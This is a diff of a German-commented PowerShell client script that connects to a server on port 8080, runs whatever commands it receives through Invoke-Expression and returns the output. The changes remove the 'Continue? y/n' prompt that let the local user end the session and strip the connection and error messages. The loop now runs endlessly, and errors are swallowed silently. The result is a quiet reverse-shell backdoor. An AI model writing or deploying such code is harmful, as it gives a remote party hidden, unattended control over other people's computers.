@@ -1,5 +1,4 @@
 #Setup Variablen
-$decision = $true
 $result = $null
 $message = $null
 # Client-Skript: Verbindet sich zum Server auf Port 8080
@@ -13,11 +12,7 @@ try {
     $reader = New-Object System.IO.StreamReader($stream)
     $writer.AutoFlush = $true
 
-    # Nachricht an den Server senden
-    $message = "Connected!"
-    $writer.WriteLine($message)
-
-    while($decision)
+    while($true)
     {
         try
         {
@@ -29,31 +24,15 @@ try {
                 # Führe den empfangenen Befehl aus und sende das Ergebnis zurück
                 $result = Invoke-Expression $message
                 $writer.WriteLine("$result")
-            
-                # Überprüft, ob die Verbindung fortgesetzt werden soll
-                $question = Read-Host -Prompt "Continue? y/n"
-                if($question -eq "y")
-                {
-                    $decision = $true
-                }
-                else 
-                {        
-                    $decision = $false   
-                }
             }
         }
         catch
-        {
-            $writer.WriteLine("Fehler bei Client: $_")
-        }
+        {}
 
     }
     # Schließe die Verbindung
     $client.Close()
-    Write-Output "Verbindung zum Server geschlossen."
 
 } 
 catch 
-{
-    Write-Output "Fehler bei der Verbindung: $_"
-}
+{}
